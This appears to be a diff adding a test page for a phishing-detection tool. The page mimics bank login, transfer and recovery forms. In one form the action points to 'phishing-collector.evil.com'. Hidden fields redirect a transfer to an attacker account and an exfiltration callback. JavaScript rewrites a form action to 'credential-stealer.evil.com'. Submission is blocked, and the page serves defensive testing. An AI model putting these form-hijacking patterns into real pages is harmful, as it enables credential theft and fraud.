@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkShield Test - Form Manipulation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 40px;
+            background: #f5f5f5;
+        }
+
+        .test-section {
+            background: white;
+            padding: 30px;
+            margin: 20px 0;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .bank-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1976d2;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin: 15px 0;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .btn-primary {
+            background: #1976d2;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 20px;
+        }
+
+        .hidden-info {
+            background: #f8d7da;
+            border: 1px solid #dc3545;
+            padding: 10px;
+            margin-top: 10px;
+            font-family: monospace;
+            font-size: 12px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="test-section">
+        <h1>🔒 Form Manipulation Test</h1>
+        <p><strong>Test ID:</strong> 10.2 & 10.3</p>
+        <p><strong>Test Type:</strong> Form action mismatch & hidden input fields</p>
+    </div>
+
+    <!-- Test 1: Form Action Mismatch -->
+    <div class="test-section">
+        <div class="bank-logo">🏦 Legitimate Bank Login</div>
+        <h3>Test 1: Form Action Mismatch</h3>
+
+        <p><strong>Visible URL:</strong> <code>https://legitimate-bank.com/login</code></p>
+
+        <form id="phishing-form" action="https://phishing-collector.evil.com/steal" method="POST">
+            <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" value="test@example.com">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" value="password123">
+            </div>
+
+            <button type="submit" class="btn-primary">Sign In</button>
+        </form>
+
+        <div class="warning">
+            <strong>⚠️ Security Test:</strong> This form displays "legitimate-bank.com" but actually submits to
+            "phishing-collector.evil.com"
+        </div>
+
+        <div class="hidden-info">
+            <strong>Actual Form Action:</strong> <span id="actual-action"></span>
+        </div>
+    </div>
+
+    <!-- Test 2: Hidden Input Fields -->
+    <div class="test-section">
+        <div class="bank-logo">🏦 Bank Transfer Form</div>
+        <h3>Test 2: Hidden Input Fields</h3>
+
+        <form id="hidden-field-form" action="https://legitimate-bank.com/transfer" method="POST">
+            <div class="form-group">
+                <label for="recipient">Transfer To:</label>
+                <input type="text" id="recipient" name="recipient_visible" value="Savings Account">
+            </div>
+
+            <div class="form-group">
+                <label for="amount">Amount:</label>
+                <input type="text" id="amount" name="amount_visible" value="$100.00">
+            </div>
+
+            <!-- Hidden malicious fields -->
+            <input type="hidden" name="actual_recipient" value="attacker-account@evil.com">
+            <input type="hidden" name="actual_amount" value="10000">
+            <input type="hidden" name="callback_url" value="https://data-exfiltration.evil.com/collect">
+            <input type="hidden" name="steal_session" value="true">
+
+            <button type="submit" class="btn-primary">Transfer Funds</button>
+        </form>
+
+        <div class="warning">
+            <strong>⚠️ Security Test:</strong> This form contains hidden fields that send data to alternate endpoints
+        </div>
+
+        <div class="hidden-info" id="hidden-fields-info">
+            <strong>Hidden Fields Detected:</strong> <span id="hidden-count">0</span><br>
+            <div id="hidden-list"></div>
+        </div>
+    </div>
+
+    <!-- Test 3: Dynamic Form Manipulation -->
+    <div class="test-section">
+        <div class="bank-logo">🏦 Account Recovery</div>
+        <h3>Test 3: JavaScript Form Hijacking</h3>
+
+        <form id="hijacked-form" action="https://legitimate-bank.com/recover" method="POST">
+            <div class="form-group">
+                <label for="email">Email Address:</label>
+                <input type="text" id="email" name="email" value="user@example.com">
+            </div>
+
+            <button type="button" class="btn-primary" onclick="hijackAndSubmit()">Recover Account</button>
+        </form>
+
+        <div class="warning">
+            <strong>⚠️ Security Test:</strong> JavaScript changes form action before submission
+        </div>
+    </div>
+
+    <script>
+        // Display actual form action
+        document.getElementById('actual-action').textContent =
+            document.getElementById('phishing-form').action;
+
+        // Count and display hidden fields
+        const hiddenFields = document.querySelectorAll('input[type="hidden"]');
+        document.getElementById('hidden-count').textContent = hiddenFields.length;
+
+        const hiddenList = document.getElementById('hidden-list');
+        hiddenFields.forEach(field => {
+            const div = document.createElement('div');
+            div.textContent = `• ${field.name} = "${field.value}"`;
+            hiddenList.appendChild(div);
+        });
+
+        // Prevent actual form submission (this is a test page)
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                alert(`Form submission blocked (test page).\nWould have sent to: ${form.action}`);
+            });
+        });
+
+        // Test 3: JavaScript hijacking
+        function hijackAndSubmit() {
+            const form = document.getElementById('hijacked-form');
+            // Attacker changes form action at the last moment
+            form.action = 'https://credential-stealer.evil.com/harvest';
+            console.log('[ATTACK] Form action hijacked to:', form.action);
+            alert(`Form action changed to: ${form.action}`);
+            // form.submit(); // Commented out for safety
+        }
+
+        console.log('[TEST] Form manipulation test page loaded');
+        console.log('[TEST] Form 1 action:', document.getElementById('phishing-form').action);
+        console.log('[TEST] Hidden fields count:', hiddenFields.length);
+    </script>
+</body>
+
+</html>
